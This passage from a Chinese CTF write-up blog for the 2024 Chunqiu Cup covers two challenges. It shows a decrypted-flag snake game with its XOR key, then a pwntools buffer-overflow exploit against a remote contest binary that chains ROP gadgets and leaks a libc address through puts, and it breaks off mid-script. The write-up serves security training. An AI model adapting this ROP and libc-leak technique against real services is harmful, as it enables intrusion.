data-num=\"76\"></td><td><pre>    <span class=\"token number\">193</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>    <span class=\"token number\">67</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>    <span class=\"token number\">174</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>    <span class=\"token number\">71</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>    <span class=\"token number\">162</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    <span class=\"token number\">248</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>    <span class=\"token number\">244</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>    <span class=\"token number\">12</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>    <span class=\"token number\">238</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>    <span class=\"token number\">92</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>    <span class=\"token number\">160</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>    <span class=\"token number\">203</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>    <span class=\"token number\">185</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>    <span class=\"token number\">155</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>decrypted_data <span class=\"token operator\">=</span> decrypt<span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> key_bytes<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>running <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre><span class=\"token keyword\">if</span> running<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>    window<span class=\"token punctuation\">.</span>fill<span class=\"token punctuation\">(</span>BLACK<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>    <span class=\"token keyword\">for</span> event <span class=\"token keyword\">in</span> pygame<span class=\"token punctuation\">.</span>event<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>        <span class=\"token keyword\">if</span> event<span class=\"token punctuation\">.</span><span class=\"token builtin\">type</span> <span class=\"token operator\">==</span> pygame<span class=\"token punctuation\">.</span>QUIT<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>            running <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>        <span class=\"token keyword\">elif</span> event<span class=\"token punctuation\">.</span><span class=\"token builtin\">type</span> <span class=\"token operator\">==</span> pygame<span class=\"token punctuation\">.</span>KEYDOWN <span class=\"token keyword\">or</span> event<span class=\"token punctuation\">.</span>key <span class=\"token operator\">==</span> pygame<span class=\"token punctuation\">.</span>K_UP<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>            snake_direction <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span>SNAKE_SPEED<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>        <span class=\"token keyword\">elif</span> event<span class=\"token punctuation\">.</span>key <span class=\"token operator\">==</span> pygame<span class=\"token punctuation\">.</span>K_DOWN<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>            snake_direction <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> SNAKE_SPEED<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>        <span class=\"token keyword\">elif</span> event<span class=\"token punctuation\">.</span>key <span class=\"token operator\">==</span> pygame<span class=\"token punctuation\">.</span>K_LEFT<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>            snake_direction <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">-</span>SNAKE_SPEED<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>        <span class=\"token keyword\">elif</span> event<span class=\"token punctuation\">.</span>key <span class=\"token operator\">==</span> pygame<span class=\"token punctuation\">.</span>K_RIGHT<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>            snake_direction <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>SNAKE_SPEED<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>            <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>            snake_head <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>snake<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> snake_direction<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> snake<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> snake_direction<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>            snake<span class=\"token punctuation\">.</span>insert<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> snake_head<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>            snake<span class=\"token punctuation\">.</span>pop<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>            <span class=\"token keyword\">if</span> snake<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> food<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>                food <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> WINDOW_WIDTH <span class=\"token operator\">-</span> SNAKE_SIZE<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> SNAKE_SIZE<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> SNAKE_SIZE<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> WINDOW_HEIGHT <span class=\"token operator\">-</span> SNAKE_SIZE<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> SNAKE_SIZE<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> SNAKE_SIZE<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>                snake<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>snake<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>    <span class=\"token keyword\">if</span> snake<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token keyword\">and</span> snake<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> WINDOW_WIDTH <span class=\"token keyword\">and</span> snake<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token keyword\">and</span> snake<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> WINDOW_HEIGHT <span class=\"token keyword\">or</span> snake<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">in</span> snake<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>        running <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>    <span class=\"token keyword\">for</span> segment <span class=\"token keyword\">in</span> snake<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>        pygame<span class=\"token punctuation\">.</span>draw<span class=\"token punctuation\">.</span>rect<span class=\"token punctuation\">(</span>window<span class=\"token punctuation\">,</span> WHITE<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>segment<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> segment<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> SNAKE_SIZE<span class=\"token punctuation\">,</span> SNAKE_SIZE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>    pygame<span class=\"token punctuation\">.</span>draw<span class=\"token punctuation\">.</span>rect<span class=\"token punctuation\">(</span>window<span class=\"token punctuation\">,</span> RED<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>food<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> food<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> SNAKE_SIZE<span class=\"token punctuation\">,</span> SNAKE_SIZE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>    score_text <span class=\"token operator\">=</span> font<span class=\"token punctuation\">.</span>render<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'''Score: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>snake<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'''</span></span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> WHITE<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>    speed_text <span class=\"token operator\">=</span> font<span class=\"token punctuation\">.</span>render<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'''Speed: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>SNAKE_SPEED<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'''</span></span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> WHITE<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>    window<span class=\"token punctuation\">.</span>blit<span class=\"token punctuation\">(</span>score_text<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>    window<span class=\"token punctuation\">.</span>blit<span class=\"token punctuation\">(</span>speed_text<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>    score <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>snake<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>    <span class=\"token keyword\">if</span> score <span class=\"token operator\">>=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>        flag_text <span class=\"token operator\">=</span> font<span class=\"token punctuation\">.</span>render<span class=\"token punctuation\">(</span><span class=\"token string\">'Flag: '</span> <span class=\"token operator\">+</span> decrypted_data<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> WHITE<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>        window<span class=\"token punctuation\">.</span>blit<span class=\"token punctuation\">(</span>flag_text<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">70</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>    pygame<span class=\"token punctuation\">.</span>display<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>    pygame<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">.</span>Clock<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>tick<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>    <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>pygame<span class=\"token punctuation\">.</span>quit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>需要导入 key</p>\n</blockquote>\n<p><img data-src=\"/img/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706171530275.png\" alt=\"image-20240706171530275\"></p>\n<blockquote>\n<p>xor_key = ‘V3rY_v3Ry_Ez’</p>\n</blockquote>\n<p>rc4 之后再去异或自身位置即可得到 flag</p>\n<blockquote KMLTz3lT_MePUDa7A_P5LpzCBT=\"\">\n<p>flag</p>\n</blockquote>\n<h3 id=\"stdout\"><a class=\"markdownIt-Anchor\" href=\"#stdout\">#</a> stdout</h3>\n<img data-src=\"/img/春秋杯夏季赛/image-20240706171807876.png\" alt=\"image-20240706171807876\" style=\"zoom:67%;\" />\n<p>程序即使有 puts 也不能输出</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0F0b21UZWFtL2FydGljbGUvZGV0YWlscy8xMzk2NzIxMjI=\">2024 全国大学生信息安全竞赛（ciscn）半决赛（东北赛区）Pwn 题解_2024ciscn 华东北赛区 wp-CSDN 博客</span></p>\n<p>类似题目</p>\n<p>exp</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>host<span class=\"token punctuation\">,</span> port <span class=\"token operator\">=</span> <span class=\"token string\">\"8.147.128.163:44437\"</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># r = process('./pwn')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'libc-2.31.so'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span> p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length             <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">debug</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\tgdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\tpause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>pop_rdi <span class=\"token operator\">=</span> <span class=\"token number\">0x00000000004013d3</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>ret <span class=\"token operator\">=</span> pop_rdi <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>pl <span class=\"token operator\">=</span> padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'vuln'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'vuln'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>se<span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">150</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    payload <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string\">b'system\\x00\\x00'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span> <span class=\"token operator\">//</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'deadbeef'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'extend'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>     p64<span class=\"token punctuation\">(</span>pop_rdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'vuln'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token comment\"># sleep(0.1)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    se<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    success<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        res<span class=\"token operator\">=</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'hello!\\n'</span><span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token keyword\">if</span> res<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>            libc_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token keyword\">except</span> EOFError<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        log<span class=\"token punctuation\">.</span>error<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"An error occurred: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>e<span class=\"token 